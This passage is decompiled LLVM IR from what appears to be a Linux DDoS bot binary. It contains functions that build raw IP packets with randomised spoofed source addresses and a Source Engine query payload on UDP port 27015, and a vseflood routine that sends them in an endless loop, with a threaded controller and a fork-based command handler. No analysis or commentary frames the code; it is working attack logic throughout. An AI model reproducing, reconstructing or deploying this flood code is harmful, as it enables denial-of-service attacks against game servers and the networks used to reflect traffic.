  %v2_804c884 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804c884 = add i32 %v1_804c884, 20
  %v4_804c884 = add i32 %v3_804c884, %v2_804c884
  %v5_804c884 = inttoptr i32 %v4_804c884 to i32*
  %v1_804c899 = or i32 %v3_804c856, 4
  %v2_804c89f = inttoptr i32 %v1_804c899 to i32*
  store i32 %v1_804c768, i32* %v2_804c89f, align 4
  store i32 %v3_804c856, i32* @ecx, align 4
  store i32 %v2_804c7bb, i32* %edx.global-to-local, align 4
  %v2_804c8b8 = mul i32 %storemerge41, 4
  %v2_804c8bb = add i32 %v2_804c8b8, %v2_804c7bb
  store i32 %v2_804c8bb, i32* %eax.global-to-local, align 4
  %v1_804c8be = load i32, i32* @esp, align 4
  %v2_804c8be = add i32 %v1_804c8be, 12
  %v3_804c8be = inttoptr i32 %v2_804c8be to i32*
  store i32 %v3_804c856, i32* %v3_804c8be, align 4
  %v0_804c8c2 = load i32, i32* @esp, align 4
  %v1_804c8c2 = add i32 %v0_804c8c2, 8
  %v2_804c8c2 = inttoptr i32 %v1_804c8c2 to i32*
  store i32 134530145, i32* %v2_804c8c2, align 4
  %v0_804c8ca = load i32, i32* @esp, align 4
  %v1_804c8ca = add i32 %v0_804c8ca, 4
  %v2_804c8ca = inttoptr i32 %v1_804c8ca to i32*
  store i32 0, i32* %v2_804c8ca, align 4
  %v0_804c8d2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c8d2 = load i32, i32* @esp, align 4
  %v2_804c8d2 = inttoptr i32 %v1_804c8d2 to i32*
  store i32 %v0_804c8d2, i32* %v2_804c8d2, align 4
  %v0_804c8d5 = call i32 @pthread_create()
  %v4_804c8da = add nuw nsw i32 %storemerge41, 1
  store i32 %v4_804c8da, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804c8da, %v1_804c742
  br i1 %exitcond, label %dec_label_pc_804c8dd.dec_label_pc_804c8e9_crit_edge, label %dec_label_pc_804c840

dec_label_pc_804c8dd.dec_label_pc_804c8e9_crit_edge: ; preds = %dec_label_pc_804c840
  %v1_804c8f1.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c8e9

dec_label_pc_804c8e9:                             ; preds = %dec_label_pc_804c8dd.dec_label_pc_804c8e9_crit_edge, %dec_label_pc_804c737
  %v1_804c8f1 = phi i32 [ %v1_804c8f1.pre, %dec_label_pc_804c8dd.dec_label_pc_804c8e9_crit_edge ], [ %v2_804c80f, %dec_label_pc_804c737 ]
  %storemerge.lcssa = phi i32 [ %v1_804c742, %dec_label_pc_804c8dd.dec_label_pc_804c8e9_crit_edge ], [ 0, %dec_label_pc_804c737 ]
  store i32 %v1_804c7e5, i32* %eax.global-to-local, align 4
  %v2_804c8ef = load i32, i32* %v1_804c7e8, align 4
  %v2_804c8f1 = add i32 %v1_804c8f1, 12
  %v3_804c8f1 = inttoptr i32 %v2_804c8f1 to i32*
  store i32 %v2_804c8ef, i32* %v3_804c8f1, align 4
  %v1_804c8f8 = load i32, i32* @esp, align 4
  %v2_804c8f8 = add i32 %v1_804c8f8, 8
  %v3_804c8f8 = inttoptr i32 %v2_804c8f8 to i32*
  store i32 %arg2, i32* %v3_804c8f8, align 4
  %v0_804c8fc = load i32, i32* @esp, align 4
  %v1_804c8fc = add i32 %v0_804c8fc, 4
  %v2_804c8fc = inttoptr i32 %v1_804c8fc to i32*
  store i32 ptrtoint ([29 x i8]* @global_var_806a20a.118 to i32), i32* %v2_804c8fc, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804c907 = load i32, i32* @esp, align 4
  %v2_804c907 = inttoptr i32 %v1_804c907 to i32*
  store i32 %arg1, i32* %v2_804c907, align 4
  %v1_804c90a = load i32, i32* %stack_var_-4, align 4
  %v2_804c90a = call i32 @Send(i32 %storemerge.lcssa, i32 %v1_804c90a)
  store i32 %v1_804c74d, i32* %eax.global-to-local, align 4
  %v2_804c91c = load i32, i32* %v1_804c750, align 4
  store i32 %v2_804c91c, i32* %eax.global-to-local, align 4
  %v1_804c91e = load i32, i32* @esp, align 4
  %v2_804c91e = inttoptr i32 %v1_804c91e to i32*
  store i32 %v2_804c91c, i32* %v2_804c91e, align 4
  %v1_804c921 = call i32 @atol(i32 0)
  %v9_804c926 = mul i32 %v1_804c921, 20
  store i32 %v9_804c926, i32* %eax.global-to-local, align 4
  %v7_804c92d = icmp sgt i32 %v9_804c926, 0
  br i1 %v7_804c92d, label %dec_label_pc_804c933, label %dec_label_pc_804c9f0

dec_label_pc_804c933:                             ; preds = %dec_label_pc_804c8e9
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 50000, i32* %eax.global-to-local, align 4
  %v1_804c942 = load i32, i32* @esp, align 4
  %v2_804c942 = inttoptr i32 %v1_804c942 to i32*
  store i32 50000, i32* %v2_804c942, align 4
  %v2_804c945 = call i32 @usleep(i64 0)
  %v0_804c94a = load i64, i64* @global_var_807e2e0.88, align 8
  %sext4 = mul i64 %v0_804c94a, 4294967296
  %v2_804c953 = sdiv i64 %sext4, 4294967296
  %v4_804c953 = mul nsw i64 %v2_804c953, 20
  %v5_804c953 = trunc i64 %v4_804c953 to i32
  store i32 %v5_804c953, i32* %edx.global-to-local, align 4
  %tmp43 = icmp ugt i32 %v5_804c953, %v1_804c755
  %v0_804c982 = load i32, i32* @global_var_807e1a8.89, align 8
  store i32 %v0_804c982, i32* %eax.global-to-local, align 4
  br i1 %tmp43, label %dec_label_pc_804c95d, label %dec_label_pc_804c982

dec_label_pc_804c95d:                             ; preds = %dec_label_pc_804c933
  %tmp32 = icmp slt i32 %v0_804c982, 1
  %tmp33 = icmp eq i1 %tmp32, false
  br i1 %tmp33, label %dec_label_pc_804c975, label %dec_label_pc_804c966

dec_label_pc_804c966:                             ; preds = %dec_label_pc_804c95d
  %v0_804c966 = load i32, i32* @global_var_8070d88.90, align 8
  %v1_804c96b = add i32 %v0_804c966, 100
  store i32 %v1_804c96b, i32* %eax.global-to-local, align 4
  store i32 %v1_804c96b, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804c9b0

dec_label_pc_804c975:                             ; preds = %dec_label_pc_804c95d
  %v1_804c97a = add i32 %v0_804c982, -1
  store i32 %v1_804c97a, i32* %eax.global-to-local, align 4
  store i32 %v1_804c97a, i32* @global_var_807e1a8.89, align 8
  br label %dec_label_pc_804c9b0

dec_label_pc_804c982:                             ; preds = %dec_label_pc_804c933
  %v1_804c987 = add i32 %v0_804c982, 1
  store i32 %v1_804c987, i32* @global_var_807e1a8.89, align 8
  %v0_804c98d = load i32, i32* @global_var_8070d88.90, align 8
  store i32 %v0_804c98d, i32* %eax.global-to-local, align 4
  %v1_804c992 = add i32 %v0_804c98d, -25
  %v5_804c992 = icmp ult i32 %v0_804c98d, 25
  %v9_804c992 = icmp eq i32 %v1_804c992, 0
  %v2_804c995 = or i1 %v5_804c992, %v9_804c992
  br i1 %v2_804c995, label %dec_label_pc_804c9a6, label %dec_label_pc_804c997

dec_label_pc_804c997:                             ; preds = %dec_label_pc_804c982
  store i32 %v1_804c992, i32* %eax.global-to-local, align 4
  store i32 %v1_804c992, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804c9b0

dec_label_pc_804c9a6:                             ; preds = %dec_label_pc_804c982
  store i32 0, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804c9b0

dec_label_pc_804c9b0:                             ; preds = %dec_label_pc_804c997, %dec_label_pc_804c975, %dec_label_pc_804c966, %dec_label_pc_804c9a6
  store i64 0, i64* @global_var_807e2e0.88, align 32
  %v5_804c9d1 = add i32 %v1_804c77b, %v2_804c6bf
  br label %dec_label_pc_804c9ba

dec_label_pc_804c9ba:                             ; preds = %dec_label_pc_804c9eb, %dec_label_pc_804c9b0
  %stack_var_-12.0 = phi i32 [ %tmp, %dec_label_pc_804c9b0 ], [ %v4_804c9eb, %dec_label_pc_804c9eb ]
  %tmp44 = icmp ult i32 %stack_var_-12.0, 100
  br i1 %tmp44, label %dec_label_pc_804c9eb, label %dec_label_pc_804c9c0

dec_label_pc_804c9c0:                             ; preds = %dec_label_pc_804c9ba
  %v0_804c9c0 = load i32, i32* @esp, align 4
  %v1_804c9c0 = inttoptr i32 %v0_804c9c0 to i32*
  store i32 0, i32* %v1_804c9c0, align 4
  %v2_804c9c7 = call i32 @__GI_time(i32* null)
  store i32 %v2_804c9c7, i32* %edx.global-to-local, align 4
  store i32 %v5_804c9d1, i32* %eax.global-to-local, align 4
  %v7_804c9d4 = icmp ult i32 %v2_804c9c7, %v5_804c9d1
  br i1 %v7_804c9d4, label %dec_label_pc_804c9eb, label %dec_label_pc_804c9d8

dec_label_pc_804c9d8:                             ; preds = %dec_label_pc_804c9c0
  %v0_804c9d8 = load i32, i32* @esp, align 4
  %v1_804c9d8 = inttoptr i32 %v0_804c9d8 to i32*
  store i32 0, i32* %v1_804c9d8, align 4
  %v1_804c9df = call i32 @__GI_exit(i32 0)
  store i32 %v1_804c9df, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c9eb

dec_label_pc_804c9eb:                             ; preds = %dec_label_pc_804c9d8, %dec_label_pc_804c9c0, %dec_label_pc_804c9ba
  %stack_var_-12.1 = phi i32 [ %stack_var_-12.0, %dec_label_pc_804c9ba ], [ 0, %dec_label_pc_804c9c0 ], [ 0, %dec_label_pc_804c9d8 ]
  %v4_804c9eb = add i32 %stack_var_-12.1, 1
  br label %dec_label_pc_804c9ba

dec_label_pc_804c9f0:                             ; preds = %dec_label_pc_804c8e9
  %v0_804c9f0 = load i32, i32* @esp, align 4
  %v1_804c9f0 = inttoptr i32 %v0_804c9f0 to i32*
  store i32 0, i32* %v1_804c9f0, align 4
  %v1_804c9f7 = call i32 @__GI_exit(i32 %tmp)
  store i32 %v1_804c9f7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c9fc

dec_label_pc_804c9fc:                             ; preds = %entry, %dec_label_pc_804c9f0
  %v0_804ca00 = phi i32 [ %v1_804c6cd, %entry ], [ %v1_804c9f7, %dec_label_pc_804c9f0 ]
  ret i32 %v0_804ca00

; uselistorder directives
  uselistorder i32 %stack_var_-12.0, { 1, 0 }
  uselistorder i32 %v1_804c992, { 1, 0, 2 }
  uselistorder i32 %v0_804c982, { 2, 1, 0, 3 }
  uselistorder i32 %v9_804c926, { 1, 0 }
  uselistorder i32 %v3_804c856, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804c84c, { 0, 2, 1 }
  uselistorder i32 %storemerge41, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804c7d0, { 1, 0 }
  uselistorder i32 %v1_804c768, { 1, 0 }
  uselistorder i32 %v1_804c742, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_804c70b, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 16, 14, 15, 36, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 34, 33, 35 }
  uselistorder i32 %arg4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804c9fc, { 1, 0 }
  uselistorder label %dec_label_pc_804c9b0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804c737, { 1, 0 }
  uselistorder label %dec_label_pc_804c70b, { 1, 0 }
}

define i32 @setup_vse_ip_header(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ca04 = load i32, i32* @edi, align 4
  %v0_804ca05 = load i32, i32* @esi, align 4
  %v0_804ca06 = load i32, i32* @ebx, align 4
  store i32 %v0_804ca06, i32* %stack_var_-16, align 4
  %v4_804ca0a = ptrtoint i8* %arg1 to i32
  store i8 69, i8* %arg1, align 1
  %v1_804ca25 = add i32 %v4_804ca0a, 1
  %v2_804ca25 = inttoptr i32 %v1_804ca25 to i8*
  store i8 0, i8* %v2_804ca25, align 1
  %v1_804ca2c = add i32 %v4_804ca0a, 2
  %v2_804ca2c = inttoptr i32 %v1_804ca2c to i16*
  store i16 53, i16* %v2_804ca2c, align 2
  %v1_804ca39 = call i32 @htonl(i32 54321)
  %v1_804ca44 = trunc i32 %v1_804ca39 to i16
  %v3_804ca44 = add i32 %v4_804ca0a, 4
  %v4_804ca44 = inttoptr i32 %v3_804ca44 to i16*
  store i16 %v1_804ca44, i16* %v4_804ca44, align 2
  %v1_804ca4b = add i32 %v4_804ca0a, 6
  %v2_804ca4b = inttoptr i32 %v1_804ca4b to i16*
  store i16 0, i16* %v2_804ca4b, align 2
  %v1_804ca54 = add i32 %v4_804ca0a, 8
  %v2_804ca54 = inttoptr i32 %v1_804ca54 to i8*
  store i8 -1, i8* %v2_804ca54, align 1
  %v1_804ca5b = add i32 %v4_804ca0a, 9
  %v2_804ca5b = inttoptr i32 %v1_804ca5b to i8*
  store i8 17, i8* %v2_804ca5b, align 1
  %v1_804ca62 = add i32 %v4_804ca0a, 10
  %v2_804ca62 = inttoptr i32 %v1_804ca62 to i16*
  store i16 0, i16* %v2_804ca62, align 2
  %v2_804ca77 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804ca77, i32* @edi, align 4
  %v2_804ca8d = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804ca8d, i32* @ebx, align 4
  %v2_804caa3 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804caa3, i32* @esi, align 4
  %v2_804cab9 = call i32 @realrand(i32 1, i32 255)
  %v0_804cabe = load i32, i32* @edi, align 4
  %v0_804cac2 = load i32, i32* @ebx, align 4
  %v0_804cac6 = load i32, i32* @esi, align 4
  %v2_804cade = ptrtoint i32* %stack_var_-33 to i32
  %v8_804cae4 = call i32 @__GI_snprintf(i32 %v2_804cade, i32 16, i32 ptrtoint ([12 x i8]* @global_var_806a197.112 to i32), i32 %v2_804cab9, i32 %v0_804cac6, i32 %v0_804cac2, i32 %v0_804cabe)
  %v1_804caef = call i32 @inet_addr(i32 %v2_804cade)
  %v3_804caf9 = add i32 %v4_804ca0a, 12
  %v4_804caf9 = inttoptr i32 %v3_804caf9 to i32*
  store i32 %v1_804caef, i32* %v4_804caf9, align 4
  %v2_804caff = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804caff, i32* @ebx, align 4
  store i32 %v0_804ca05, i32* @esi, align 4
  store i32 %v0_804ca04, i32* @edi, align 4
  ret i32 %v4_804ca0a

; uselistorder directives
  uselistorder i16 53, { 3, 0, 1, 2 }
}

define i32 @setup_vse_header(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804cb08 = load i32, i32* @esi, align 4
  store i32 %v0_804cb08, i32* %stack_var_-12, align 4
  %v2_804cb13 = call i32 @htons(i16 27015)
  %v4_804cb1b = ptrtoint i16* %arg1 to i32
  %v1_804cb1e = trunc i32 %v2_804cb13 to i16
  store i16 %v1_804cb1e, i16* %arg1, align 2
  %v2_804cb28 = call i32 @htons(i16 27015)
  %v1_804cb33 = trunc i32 %v2_804cb28 to i16
  %v3_804cb33 = add i32 %v4_804cb1b, 2
  %v4_804cb33 = inttoptr i32 %v3_804cb33 to i16*
  store i16 %v1_804cb33, i16* %v4_804cb33, align 2
  %v1_804cb3a = add i32 %v4_804cb1b, 6
  %v2_804cb3a = inttoptr i32 %v1_804cb3a to i16*
  store i16 0, i16* %v2_804cb3a, align 2
  %v1_804cb43 = add i32 %v4_804cb1b, 8
  %v1_804cb4c = inttoptr i32 %v1_804cb43 to i32*
  store i32 -1, i32* %v1_804cb4c, align 4
  %v1_804cb55 = add i32 %v4_804cb1b, 12
  %v1_804cb58 = inttoptr i32 %v1_804cb55 to i8*
  store i1 false, i1* @df, align 1
  %v7_804cb65 = call i8* @_memcpy(i8* %v1_804cb58, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_806a227.119, i32 0, i32 0), i32 21)
  %v2_804cb6e = call i32 @htons(i16 33)
  %v1_804cb79 = trunc i32 %v2_804cb6e to i16
  %v4_804cb79 = add i32 %v4_804cb1b, 4
  %v5_804cb79 = inttoptr i32 %v4_804cb79 to i16*
  store i16 %v1_804cb79, i16* %v5_804cb79, align 2
  %v2_804cb80 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804cb80, i32* @esi, align 4
  ret i32 %v4_804cb1b

; uselistorder directives
  uselistorder i32 %v4_804cb1b, { 0, 1, 3, 2, 4, 5 }
  uselistorder i16* %arg1, { 1, 0 }
}

define i32 @vseflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4140 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %v2_804cb94 = ptrtoint i32* %stack_var_-4124 to i32
  %v1_804cba0 = add i32 %v2_804cb94, 20
  store i32 2, i32* %stack_var_-4140, align 4
  store i32 17015, i32* %stack_var_-4188, align 4
  %v2_804cbb6 = call i32 @htons(i16 17015)
  store i32 %arg1, i32* %stack_var_-4188, align 4
  %v1_804cbcb = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-4188, align 4
  %v3_804cbed = call i32 @socket(i32 2, i32 3, i32 17)
  %v5_804cbf5 = icmp slt i32 %v3_804cbed, 0
  %v1_804cbf9 = icmp eq i1 %v5_804cbf5, false
  br i1 %v1_804cbf9, label %dec_label_pc_804cc07, label %dec_label_pc_804cbfb

dec_label_pc_804cbfb:                             ; preds = %entry
  store i32 -1, i32* %stack_var_-4188, align 4
  %v1_804cc02 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804cc07

dec_label_pc_804cc07:                             ; preds = %entry, %dec_label_pc_804cbfb
  store i32 %v2_804cb94, i32* %stack_var_-4188, align 4
  %v3_804cc23 = bitcast i32* %stack_var_-4124 to i8*
  %v4_804cc23 = call i32 @__GI_memset(i8* %v3_804cc23, i32 0, i32 4096)
  store i32 %v2_804cb94, i32* %stack_var_-4188, align 4
  %v2_804cc2e = call i32 @setup_vse_ip_header(i8* %v3_804cc23)
  store i32 %v1_804cba0, i32* %stack_var_-4188, align 4
  %v1_804cc39 = inttoptr i32 %v1_804cba0 to i16*
  %v2_804cc39 = call i32 @setup_vse_header(i16* %v1_804cc39)
  %v2_804cc47 = add i32 %v2_804cb94, 16
  %v3_804cc47 = inttoptr i32 %v2_804cc47 to i32*
  store i32 %v1_804cbcb, i32* %v3_804cc47, align 4
  %v1_804cc4d = or i32 %v2_804cb94, 2
  %v2_804cc4d = inttoptr i32 %v1_804cc4d to i16*
  %v3_804cc4d = load i16, i16* %v2_804cc4d, align 2
  %v4_804cc4d = zext i16 %v3_804cc4d to i32
  store i32 %v2_804cb94, i32* %stack_var_-4188, align 4
  %v2_804cc5e = bitcast i32* %stack_var_-4124 to i16*
  %v3_804cc5e = call i32 @csum(i16* %v2_804cc5e, i32 %v4_804cc4d)
  %v1_804cc69 = trunc i32 %v3_804cc5e to i16
  %v3_804cc69 = add i32 %v2_804cb94, 10
  %v4_804cc69 = inttoptr i32 %v3_804cc69 to i16*
  store i16 %v1_804cc69, i16* %v4_804cc69, align 2
  store i32 1, i32* %stack_var_-4144, align 4
  %v2_804cc77 = ptrtoint i32* %stack_var_-4144 to i32
  store i32 %v3_804cbed, i32* %stack_var_-4188, align 4
  %v5_804cca5 = call i32 @__GI_setsockopt(i32 %v3_804cbed, i32 0, i32 3, i32 %v2_804cc77, i32 4)
  %v2_804ccaa = icmp slt i32 %v5_804cca5, 0
  %v1_804ccac = icmp eq i1 %v2_804ccaa, false
  br i1 %v1_804ccac, label %dec_label_pc_804ccba, label %dec_label_pc_804ccae

dec_label_pc_804ccae:                             ; preds = %dec_label_pc_804cc07
  store i32 -1, i32* %stack_var_-4188, align 4
  %v1_804ccb5 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804ccba

dec_label_pc_804ccba:                             ; preds = %dec_label_pc_804cc07, %dec_label_pc_804ccae
  store i32 0, i32* %stack_var_-4188, align 4
  %v2_804ccc1 = call i32 @__GI_time(i32* null)
  store i32 %v2_804ccc1, i32* %stack_var_-4188, align 4
  %v1_804ccc9 = call i32 @init_rand(i32 %v2_804ccc1)
  %v2_804ccd8 = ptrtoint i32* %stack_var_-4140 to i32
  %v2_804cd59 = add i32 %v2_804cb94, 12
  %v3_804cd59 = inttoptr i32 %v2_804cd59 to i32*
  %v3_804cd6f = add i32 %v2_804cb94, 4
  %v4_804cd6f = inttoptr i32 %v3_804cd6f to i16*
  br label %dec_label_pc_804ccd8

dec_label_pc_804ccd8:                             ; preds = %dec_label_pc_804cdc5, %dec_label_pc_804ccba
  %storemerge = phi i32 [ %v4_804cdc5, %dec_label_pc_804cdc5 ], [ 0, %dec_label_pc_804ccba ]
  %v3_804cce1 = load i16, i16* %v2_804cc4d, align 2
  %v4_804cce1 = zext i16 %v3_804cce1 to i32
  store i32 %v3_804cbed, i32* %stack_var_-4188, align 4
  %v6_804cd0d = call i32 @sendto(i32 %v3_804cbed, i32 %v2_804cb94, i32 %v4_804cce1, i32 0, i32 %v2_804ccd8, i32 16)
  %v0_804cd12 = load i32, i32* %stack_var_-4188, align 4
  %v1_804cd12 = call i32 @rand_cmwc(i32 %v0_804cd12)
  %v2_804cd17 = urem i32 %v1_804cd12, 16777216
  %v2_804cd21 = sub i32 %v1_804cd12, %v2_804cd17
  store i32 %v2_804cd21, i32* @ebx, align 4
  %v0_804cd24 = load i32, i32* %stack_var_-4188, align 4
  %v1_804cd24 = call i32 @rand_cmwc(i32 %v0_804cd24)
  %sext = mul i32 %v1_804cd24, 65536
  %v1_804cd29 = sdiv i32 %sext, 65536
  %v1_804cd2c = and i32 %v1_804cd29, 16711680
  %v0_804cd34 = load i32, i32* @ebx, align 4
  %v2_804cd34 = or i32 %v1_804cd2c, %v0_804cd34
  store i32 %v2_804cd34, i32* @ebx, align 4
  %v0_804cd36 = load i32, i32* %stack_var_-4188, align 4
  %v1_804cd36 = call i32 @rand_cmwc(i32 %v0_804cd36)
  %sext1 = mul i32 %v1_804cd36, 16777216
  %v1_804cd3b = sdiv i32 %sext1, 16777216
  %v1_804cd3e = and i32 %v1_804cd3b, 65280
  %v0_804cd46 = load i32, i32* @ebx, align 4
  %v2_804cd46 = or i32 %v1_804cd3e, %v0_804cd46
  store i32 %v2_804cd46, i32* @ebx, align 4
  %v0_804cd48 = load i32, i32* %stack_var_-4188, align 4
  %v1_804cd48 = call i32 @rand_cmwc(i32 %v0_804cd48)
  %v1_804cd4d = urem i32 %v1_804cd48, 256
  %v0_804cd52 = load i32, i32* @ebx, align 4
  %v2_804cd54 = or i32 %v0_804cd52, %v1_804cd4d
  store i32 %v2_804cd54, i32* %v3_804cd59, align 4
  %v0_804cd5c = load i32, i32* %stack_var_-4188, align 4
  %v1_804cd5c = call i32 @rand_cmwc(i32 %v0_804cd5c)
  store i32 %v1_804cd5c, i32* %stack_var_-4188, align 4
  %v1_804cd64 = call i32 @htonl(i32 %v1_804cd5c)
  %v1_804cd6f = trunc i32 %v1_804cd64 to i16
  store i16 %v1_804cd6f, i16* %v4_804cd6f, align 4
  %v3_804cd76 = load i16, i16* %v2_804cc4d, align 2
  %v4_804cd76 = zext i16 %v3_804cd76 to i32
  store i32 %v2_804cb94, i32* %stack_var_-4188, align 4
  %v3_804cd87 = call i32 @csum(i16* %v2_804cc5e, i32 %v4_804cd76)
  %v1_804cd92 = trunc i32 %v3_804cd87 to i16
  store i16 %v1_804cd92, i16* %v4_804cc69, align 2
  %v0_804cd96 = load i64, i64* @global_var_807e2e0.88, align 8
  %v1_804cd96 = trunc i64 %v0_804cd96 to i32
  %v1_804cd9b = add i32 %v1_804cd96, 1
  %v1_804cd9c = sext i32 %v1_804cd9b to i64
  store i64 %v1_804cd9c, i64* @global_var_807e2e0.88, align 32
  %v0_804cda1 = load i32, i32* @global_var_807e1a8.89, align 8
  %v6_804cdac = icmp ugt i32 %v0_804cda1, %storemerge
  br i1 %v6_804cdac, label %dec_label_pc_804cdc5, label %dec_label_pc_804cdae

dec_label_pc_804cdae:                             ; preds = %dec_label_pc_804ccd8
  %v0_804cdb8 = load i32, i32* @global_var_8070d88.90, align 8
  store i32 %v0_804cdb8, i32* %stack_var_-4188, align 4
  %v1_804cdc0 = sext i32 %v0_804cdb8 to i64
  %v2_804cdc0 = call i32 @usleep(i64 %v1_804cdc0)
  br label %dec_label_pc_804cdc5

dec_label_pc_804cdc5:                             ; preds = %dec_label_pc_804ccd8, %dec_label_pc_804cdae
  %stack_var_-4156.0 = phi i32 [ %storemerge, %dec_label_pc_804ccd8 ], [ 0, %dec_label_pc_804cdae ]
  %v4_804cdc5 = add i32 %stack_var_-4156.0, 1
  br label %dec_label_pc_804ccd8

; uselistorder directives
  uselistorder i32 %v3_804cbed, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_804cba0, { 1, 0 }
  uselistorder i32 %v2_804cb94, { 6, 7, 1, 2, 3, 8, 0, 4, 5, 9, 10 }
  uselistorder i32* %stack_var_-4188, { 5, 6, 7, 3, 4, 1, 2, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %stack_var_-4144, { 1, 0 }
  uselistorder i32* %stack_var_-4140, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804cdc5, { 1, 0 }
  uselistorder label %dec_label_pc_804ccba, { 1, 0 }
  uselistorder label %dec_label_pc_804cc07, { 1, 0 }
}

define i32 @vset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cdd0 = load i32, i32* @ebp, align 4
  store i32 %v0_804cdd0, i32* %stack_var_-4, align 4
  %v4_804cdd0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804cdd0, i32* @ebp, align 4
  %v15_804cdd3 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v15_804cdd3, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-76, align 4
  %v2_804cde2 = call i32 @__GI_time(i32* null)
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-76, align 4
  %v1_804cdf0 = call i32 @mfork(i32 %arg2)
  store i32 %v1_804cdf0, i32* %eax.global-to-local, align 4
  %v1_804cdf5 = icmp eq i32 %v1_804cdf0, 0
  %v1_804cdf7 = icmp eq i1 %v1_804cdf5, false
  br i1 %v1_804cdf7, label %dec_label_pc_804d035, label %dec_label_pc_804cdfd

dec_label_pc_804cdfd:                             ; preds = %entry
  store i32 2, i32* %stack_var_-76, align 4
  %v4_804ce14 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v4_804ce14, i32* %eax.global-to-local, align 4
  %v5_804ce1c = icmp slt i32 %v4_804ce14, 0
  %v1_804ce20 = icmp eq i1 %v5_804ce1c, false
  br i1 %v1_804ce20, label %dec_label_pc_804ce2e, label %dec_label_pc_804ce22

dec_label_pc_804ce22:                             ; preds = %dec_label_pc_804cdfd
  store i32 1, i32* %stack_var_-76, align 4
  %v1_804ce29 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804ce29, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ce2e

dec_label_pc_804ce2e:                             ; preds = %dec_label_pc_804cdfd, %dec_label_pc_804ce22
  %v4_804ce2e = add i32 %arg3, -3
  %v9_804ce2e = sub i32 2, %arg3
  %v10_804ce2e = and i32 %v9_804ce2e, %arg3
  %v11_804ce2e = icmp slt i32 %v10_804ce2e, 0
  %v12_804ce2e = icmp eq i32 %v4_804ce2e, 0
  %v13_804ce2e = icmp slt i32 %v4_804ce2e, 0
  %v3_804ce32 = icmp eq i1 %v13_804ce2e, %v11_804ce2e
  %v4_804ce32 = icmp eq i1 %v12_804ce2e, false
  %v5_804ce32 = and i1 %v4_804ce32, %v3_804ce32
  br i1 %v5_804ce32, label %dec_label_pc_804ce5a, label %dec_label_pc_804ce34

dec_label_pc_804ce34:                             ; preds = %dec_label_pc_804ce2e
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-76, align 4
  %v3_804ce49 = call i32 @Send(i32 %arg1, i32 ptrtoint ([90 x i8]* @global_var_806a23c.120 to i32))
  store i32 %v3_804ce49, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-76, align 4
  %v1_804ce55 = call i32 @__GI_exit(i32 -1)
  store i32 %v1_804ce55, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ce5a

dec_label_pc_804ce5a:                             ; preds = %dec_label_pc_804ce2e, %dec_label_pc_804ce34
  %v1_804ce5d = add i32 %arg4, 8
  store i32 %v1_804ce5d, i32* %eax.global-to-local, align 4
  %v1_804ce60 = inttoptr i32 %v1_804ce5d to i32*
  %v2_804ce60 = load i32, i32* %v1_804ce60, align 4
  store i32 %v2_804ce60, i32* %eax.global-to-local, align 4
  store i32 %v2_804ce60, i32* %stack_var_-76, align 4
  %v1_804ce65 = call i32 @atol(i32 %v2_804ce60)
  %v1_804ce70 = add i32 %arg4, 12
  store i32 %v1_804ce70, i32* %eax.global-to-local, align 4
  %v1_804ce73 = inttoptr i32 %v1_804ce70 to i32*
  %v2_804ce73 = load i32, i32* %v1_804ce73, align 4
